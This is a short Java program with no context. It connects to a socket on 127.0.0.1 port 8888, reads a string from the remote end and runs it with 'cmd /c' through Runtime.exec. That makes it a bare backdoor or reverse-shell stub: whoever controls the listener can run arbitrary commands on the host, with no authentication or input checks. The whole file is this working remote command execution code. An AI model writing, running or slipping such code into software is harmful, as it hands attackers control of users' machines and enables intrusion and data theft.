import java.net.*;
import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("127.0.0.1", 8888);
            InputStream inFromServer = socket.getInputStream();
            DataInputStream in = new DataInputStream(inFromServer);
            Runtime.getRuntime().exec("cmd /c "+in.readUTF());
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
